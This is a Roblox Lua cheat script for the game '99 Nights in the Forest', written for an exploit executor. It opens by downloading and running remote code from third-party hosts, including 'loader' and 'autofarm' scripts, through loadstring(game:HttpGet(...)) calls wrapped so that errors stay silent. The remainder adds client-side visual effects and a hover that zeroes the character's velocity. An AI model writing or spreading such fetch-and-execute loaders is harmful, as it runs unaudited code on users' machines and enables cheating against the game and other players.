-- =====================================================================
-- ULTIMATE HYBRID SUITE: 99 Nights in the Forest [Berserk & Psychopath Build]
-- Target Executor: Delta X / Custom Environments
-- =====================================================================

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer

-- 1. Инициализация базовых инфраструктурных модулей
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/nightsintheforest.lua", true))()
    end)
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://foxname.top/loader"))()
        loadstring(game:HttpGet("https://foxname.top/autofarm"))()
    end)
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/wefwef127382/99daysloader.github.io/refs/heads/main/ringta.lua"))()
    end)
end)

-- 2. Основной модуль визуального террора и кастомизации
local function applyBerserkPsychopathSuite()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local rootPart = character:WaitForChild("HumanoidRootPart")
    local humanoid = character:WaitForChild("Humanoid")
    local rightArm = character:FindFirstChild("Right Arm") or character:FindFirstChild("RightHand")

    -- Подсветка психопата (кроваво-красный контур)
    if not character:FindFirstChild("PsychopathHighlight") then
        local highlight = Instance.new("Highlight")
        highlight.Name = "PsychopathHighlight"
        highlight.Adornee = character
        highlight.FillColor = Color3.fromRGB(90, 0, 0)
        highlight.OutlineColor = Color3.fromRGB(255, 20, 20)
        highlight.FillTransparency = 0.35
        highlight.OutlineTransparency = 0
        highlight.Parent = character
    end

    -- Эффект парового шлейфа титана
    local attachment = rootPart:FindFirstChild("TitanAttachment") or Instance.new("Attachment", rootPart)
    attachment.Name = "TitanAttachment"
    
    local particles = attachment:FindFirstChild("TitanSteam") or Instance.new("ParticleEmitter")
    particles.Name = "TitanSteam"
    particles.Color = ColorSequence.new(Color3.fromRGB(240, 240, 240), Color3.fromRGB(160, 160, 160))
    particles.Size = NumberSequence.new(1.5, 4.0)
    particles.Transparency = NumberSequence.new(0.3, 1.0)
    particles.Lifetime = NumberRange.new(0.6, 1.2)
    particles.Rate = 45
    particles.Speed = NumberRange.new(6, 14)
    particles.Parent = attachment

    -- Правая рука Гайца (Проклятая демоническая рука / пушка)
    if rightArm and not character:FindFirstChild("GutsArmManifest") then
        local gutsArmPart = Instance.new("Part")
        gutsArmPart.Name = "GutsArmManifest"
        gutsArmPart.Size = Vector3.new(0.7, 1.4, 0.7)
        gutsArmPart.BrickColor = BrickColor.new("Really black")
        gutsArmPart.Material = Enum.Material.Neon
        gutsArmPart.CanCollide = false
        gutsArmPart.Transparency = 0.15

        local wConstraint = Instance.new("WeldConstraint")
        wConstraint.Part0 = rightArm
        wConstraint.Part1 = gutsArmPart
        wConstraint.Parent = gutsArmPart
        
        gutsArmPart.CFrame = rightArm.CFrame * CFrame.new(0, -0.2, 0)
        gutsArmPart.Parent = character
    end

    -- Голографический терминал управления
    local holoScreen = character:FindFirstChild("HologramTerminal")
    if not holoScreen then
        holoScreen = Instance.new("Part")
        holoScreen.Name = "HologramTerminal"
        holoScreen.Size = Vector3.new(2.5, 1.5, 0.1)
        holoScreen.BrickColor = BrickColor.new("Bright red")
        holoScreen.Material = Enum.Material.Neon
        holoScreen.CanCollide = false
        holoScreen.Transparency = 0.3

        local wConstraint = Instance.new("WeldConstraint")
        wConstraint.Part0 = rootPart
        wConstraint.Part1 = holoScreen
        wConstraint.Parent = holoScreen
        
        holoScreen.CFrame = rootPart.CFrame * CFrame.new(0, 1, -2)
        holoScreen.Parent = character
    end

    -- Аура психопата с живыми наблюдающими глазами
    local eyesFolder = character:FindFirstChild("AuraEyesFolder") or Instance.new("Folder", character)
    eyesFolder.Name = "AuraEyesFolder"
    eyesFolder:ClearAllChildren()

    local eyeParts = {}
    for i = 1, 6 do
        local eye = Instance.new("Part")
        eye.Name = "PsychopathEye_" .. i
        eye.Size = Vector3.new(0.4, 0.2, 0.4)
        eye.Shape = Enum.PartType.Ball
        eye.Material = Enum.Material.Neon
        eye.BrickColor = BrickColor.new("Bright red")
        eye.CanCollide = false
        eye.Parent = eyesFolder
        table.insert(eyeParts, eye)
    end

    -- Динамический рендер-цикл (Левитация, глаза, мерцание)
    local connection
    connection = RunService.RenderStepped:Connect(function()
        if not character or not humanoid or humanoid.Health <= 0 then
            if connection then connection:Disconnect() end
            if holoScreen then holoScreen:Destroy() end
            if eyesFolder then eyesFolder:Destroy() end
            return
        end

        local timeVal = tick()
        
        if rootPart then
            -- Зависание в воздухе
            rootPart.Velocity = Vector3.new(0, 0, 0)
            
            -- Мерцание голограммы
            if holoScreen then
                holoScreen.Transparency = 0.2 + math.sin(timeVal * 15) * 0.1
            end

            -- Орбитальное движение живых глаз вокруг персонажа (внушающих страх)
            for index, eyePart in ipairs(eyeParts) do
                local angle = (timeVal * 3) + (index * (math.pi / 3))
                local radius = 3.5 + math.sin(timeVal * 2 + index) * 0.5
                local heightOffset = math.sin(timeVal * 4 + index) * 1.5
                
                local offsetPos = Vector3.new(math.cos(angle) * radius, heightOffset, math.sin(angle) * radius)
                eyePart.CFrame = rootPart.CFrame + offsetPos
            end
        end
    end)
end

-- Хук на респаун персонажа
LocalPlayer.CharacterAdded:Connect(function()
    task.wait(1)
    applyBerserkPsychopathSuite()
end)

if LocalPlayer.Character then
    task.spawn(applyBerserkPsychopathSuite)
end

print("[SYSTEM] Ultimate Berserk & Psychopath Suite successfully loaded.")
